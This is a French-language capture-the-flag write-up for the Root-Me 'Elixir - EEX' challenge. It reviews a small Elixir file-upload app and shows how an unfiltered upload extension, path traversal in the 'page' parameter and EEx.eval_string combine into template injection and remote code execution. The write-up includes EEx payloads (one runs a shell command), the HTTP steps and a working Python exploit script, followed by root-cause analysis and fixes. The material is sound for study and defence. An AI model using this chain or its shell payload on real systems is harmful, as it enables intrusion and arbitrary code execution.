# Writeup — CloudService : SSTI Elixir / EEx → RCE

> Challenge type : web / code review (Root-Me — « Elixir - EEX »)
> Stack : Elixir 1.12, Plug/Cowboy, moteur de templates EEx
> Impact : Server-Side Template Injection menant à une exécution de code arbitraire (RCE)

---

## 1. Contexte

L'application est un petit « cloud service » qui permet d'uploader des fichiers temporaires (supprimés au bout de 10 minutes) et de parcourir quelques pages. Le code source complet est servi par l'application elle-même (`GET /source.zip`), ce qui invite à une revue de code plutôt qu'à du fuzzing aveugle.

L'objectif est de lire `flag.txt`, situé à la racine de l'application (`/app/flag.txt` dans le conteneur).

Arborescence utile :

```
cloud_service/
├── flag.txt
├── uploads/                      ← fichiers uploadés (écriture attaquant)
└── lib/
    ├── router.ex                 ← routes HTTP
    ├── template_engine.ex        ← cœur de la vulnérabilité
    ├── upload.ex                 ← GenServer d'upload
    ├── supervisor.ex
    ├── application.ex
    └── views/
        ├── index.eex
        ├── upload.eex
        ├── error.eex
        └── _navbar.eex, _head.eex, _footer.eex
```

---

## 2. Reconnaissance du code

### 2.1 Le moteur de templates

`lib/template_engine.ex` est le point névralgique :

```elixir
defmodule CloudService.TemplateEngine do
  def render_view(view, bindings \\ []) do
    filepath = Path.join ["lib/views", view <> ".eex"]

    case File.read filepath do
      {:ok, file} -> EEx.eval_string(file, assigns: bindings)
      {:error, error} -> raise "internal server error (#{Atom.to_string error})"
    end
  end
end
```

Trois faits déterminants :

1. `view` est concaténé dans un chemin : `lib/views/<view>.eex`.
2. `File.read` lit ce chemin **sans validation**.
3. `EEx.eval_string/2` **compile et exécute** le contenu lu comme du code Elixir à l'exécution.

EEx n'est pas un simple moteur d'interpolation : une expression `<%= ... %>` est du **code Elixir arbitraire**. Autrement dit, quiconque contrôle le *contenu* du fichier évalué contrôle le serveur.

> ⚠️ Nuance importante : les *bindings* (second argument) ne sont **pas** un vecteur d'injection. Les valeurs passées en `assigns:` sont insérées comme des données via `<%= @x %>` et ne sont pas réévaluées comme du template. Le vecteur réel est le **choix du fichier** évalué, pas les variables.

### 2.2 Le routeur

`lib/router.ex` branche la racine sur ce moteur :

```elixir
get "/" do
  conn = Plug.Conn.fetch_query_params(conn)
  page = Map.get conn.query_params, "page", "index"   # ← contrôlé par l'utilisateur

  try do
    bindings = map_to_keyword_list conn.query_params |> Map.drop([:page])
    send_page conn, 200, page, bindings                # → render_view(page, bindings)
  rescue
    _err -> send_page conn, 400, "error", error: "bad request"
  end
end
```

Le paramètre `page` de l'URL arrive directement comme nom de vue, sans liste blanche ni filtrage. `send_page` appelle `render_view(page, bindings)`.

> Note : `map_to_keyword_list` utilise `String.to_existing_atom/1`, ce qui protège contre l'épuisement de la table d'atomes — ce point précis est correctement traité, mais il ne protège en rien contre la SSTI.

### 2.3 L'upload

`lib/upload.ex` (GenServer) écrit le fichier uploadé :

```elixir
def handle_call({:upload, data, upload}, _from, table) do
  %Plug.Upload{filename: filename, content_type: content_type} = upload
  output_file = UUID.uuid4(:default) <> Path.extname(filename)   # ← extension = celle du client
  raw = data |> String.replace("data:#{content_type};base64,", "")

  binary_content = case Base.decode64(raw) do
    {:ok, result} -> result
    _ -> nil
  end
  # ... File.write("uploads/" <> output_file, binary_content)
end
```

Deux propriétés clés :

- Le **contenu** est arbitraire (base64 fourni par le client, décodé tel quel).
- L'**extension** provient du nom de fichier fourni par le client (`Path.extname(filename)`), sans liste blanche. On peut donc forcer une extension `.eex`.

Le nom final est `<uuid>.eex`, l'UUID étant renvoyé dans la réponse HTTP — donc **connu de l'attaquant**.

---

## 3. Analyse de la vulnérabilité

On dispose de tous les maillons d'une chaîne SSTI → RCE :

| Maillon | Fourni par | Rôle |
|---|---|---|
| Écrire un fichier au contenu arbitraire | `POST /api/upload` | Déposer la charge EEx |
| Choisir l'extension `.eex` | `Path.extname(filename)` non filtré | Le moteur n'évalue que les `.eex` |
| Faire évaluer un fichier arbitraire | `page` non filtré + `Path.join` | Path traversal vers `uploads/` |
| Exécution | `EEx.eval_string/2` | RCE |

### 3.1 Le path traversal

`Path.join(["lib/views", view <> ".eex"])` **ne normalise pas** les `..` : il se contente de joindre avec `/`. C'est le système de fichiers qui résout les `..` au moment du `File.read`, relativement au répertoire de travail (`/app`).

Pour `view = "../../uploads/<uuid>"` :

```
Path.join(["lib/views", "../../uploads/<uuid>.eex"])
  = "lib/views/../../uploads/<uuid>.eex"

Résolution OS depuis /app :
  lib/views  → ..  → lib  → ..  → (racine app)  → uploads/<uuid>.eex
  = uploads/<uuid>.eex
```

C'est exactement l'emplacement où `upload.ex` écrit ses fichiers (`File.write("uploads/" <> output_file, ...)`). La boucle est bouclée.

### 3.2 Pourquoi `/show/:file` est contourné

L'endpoint légitime pour relire un fichier, `GET /show/:file`, vérifie sa présence dans la table ETS via `is_available`. Mais notre chaîne **ne passe pas** par `/show` : elle passe par `GET /?page=...` → `render_view`, qui lit le fichier *directement* sur le disque. La vérification ETS est donc totalement hors-circuit.

### 3.3 Pourquoi le contenu uploadé n'a pas besoin d'être « valide »

`render_view` évalue le fichier quel que soit son type ; il suffit que l'extension soit `.eex` (imposée par le chemin) et que le contenu soit du EEx syntaxiquement correct. Aucune contrainte de type MIME réelle n'est appliquée côté serveur.

---

## 4. Exploitation

### 4.1 Charge EEx

Objectif minimal — lire le flag :

```eex
<%= File.read!("flag.txt") %>
```

Ou RCE générique (preuve d'exécution de commande) :

```eex
<%= System.cmd("sh", ["-c", "id; cat flag.txt"]) |> elem(0) %>
```

### 4.2 Étapes

1. **Upload** de la charge sous une extension `.eex` :

   ```
   POST /api/upload
   Content-Type: multipart/form-data

   data  = base64("<%= File.read!(\"flag.txt\") %>")
   file  = (un Plug.Upload dont filename se termine par .eex)
   ```

   La réponse renvoie l'UUID, p. ex. `3f2c...e1.eex`.

2. **Déclenchement** via path traversal sur `page` (en retirant l'extension `.eex`, que le moteur rajoute) :

   ```
   GET /?page=../../uploads/3f2c...e1
   ```

   Le flag est renvoyé dans le corps de la réponse HTML.

### 4.3 Script d'exploitation (Python)

```python
import re, base64, requests

BASE = "http://localhost:4001"
payload = '<%= File.read!("flag.txt") %>'          # ou System.cmd(...) pour une RCE

# 1) Upload : extension .eex imposée par le nom de fichier ; contenu = base64
b64 = base64.b64encode(payload.encode()).decode()
files = {"file": ("x.eex", payload, "application/octet-stream")}
data  = {"data": b64}                               # pas de préfixe data: nécessaire côté API
r = requests.post(f"{BASE}/api/upload", data=data, files=files)
uuid_eex = r.text.strip()                           # ex. "3f2c...e1.eex"
name = re.sub(r"\.eex$", "", uuid_eex)              # on retire .eex (le moteur le rajoute)

# 2) Déclenchement : path traversal depuis lib/views vers uploads/
r = requests.get(f"{BASE}/", params={"page": f"../../uploads/{name}"})
print(r.text)
```

> Remarque sur l'encodage : côté frontend officiel, `data` arrive sous la forme `data:<mime>;base64,<...>` et le serveur strippe ce préfixe avant de décoder. En appelant l'API directement, envoyer simplement le base64 brut suffit, puisque le `String.replace` ne retire le préfixe que s'il est présent.

---

## 5. Cause racine

La vulnérabilité ne tient pas à un seul bug mais à une **conception dangereuse du rendu** combinée à deux absences de validation :

1. **Évaluation de templates au runtime avec un nom de vue dynamique.** `EEx.eval_string` sur un fichier choisi à l'exécution transforme « lire un fichier » en « exécuter un fichier ». C'est l'anti-pattern central.
2. **`page` non restreint**, autorisant le path traversal (`Path.join` ne neutralise pas les `..`).
3. **Extension d'upload non restreinte**, autorisant le dépôt de `.eex` exécutables dans le webroot.

Chacune est nécessaire ; ensemble elles donnent une RCE.

---

## 6. Remédiation

### 6.1 Verrouiller le nom de vue (liste blanche)

```elixir
@views ~w(index upload error)

page = Map.get(conn.query_params, "page", "index")
page = if page in @views, do: page, else: "error"
```

Une liste blanche est préférable à un simple filtrage de `..`/`/`, car elle élimine toute la classe du problème (traversal, fichiers inattendus, etc.).

### 6.2 Restreindre les extensions d'upload

```elixir
@allowed_ext ~w(.png .jpg .jpeg .gif .pdf)

ext = filename |> Path.extname() |> String.downcase()
if ext not in @allowed_ext do
  {:reply, {:error, :bad_extension}, table, @check_every}
else
  # ... écriture
end
```

### 6.3 Corriger la conception du rendu (fond du problème)

Ne jamais `EEx.eval_string` un template au runtime à partir d'un nom dynamique. Les templates doivent être **précompilés** à la compilation :

- `EEx.function_from_file/5` pour générer une fonction par vue connue, ou
- `Phoenix.Template` / `Phoenix.View`, qui compilent les templates et rendent impossible le choix d'un fichier arbitraire à l'exécution.

Avec des templates précompilés, le paramètre `page` ne peut plus sélectionner qu'une fonction existante parmi un ensemble fermé : la SSTI disparaît par construction.

### 6.4 Durcissements complémentaires

- Servir `uploads/` sur un **chemin/volume distinct** du webroot et non exécutable par le moteur de templates.
- Vérifier les *magic bytes* plutôt que de se fier au `content_type` client.
- Imposer une **limite de taille** d'upload (via `Plug.Parsers`) — accessoire à la SSTI, mais utile contre le DoS.

---

## 7. Résumé

| | |
|---|---|
| **Classe** | SSTI (CWE-1336) → RCE (CWE-94) |
| **Vecteur** | `GET /?page=` (path traversal) + `POST /api/upload` (extension `.eex` arbitraire) |
| **Primitive** | `EEx.eval_string` sur un fichier attaquant-contrôlé |
| **Impact** | Exécution de code arbitraire, lecture de `flag.txt` |
| **Correctif clé** | Liste blanche des vues + templates précompilés (Phoenix.View / `function_from_file`) + liste blanche d'extensions |
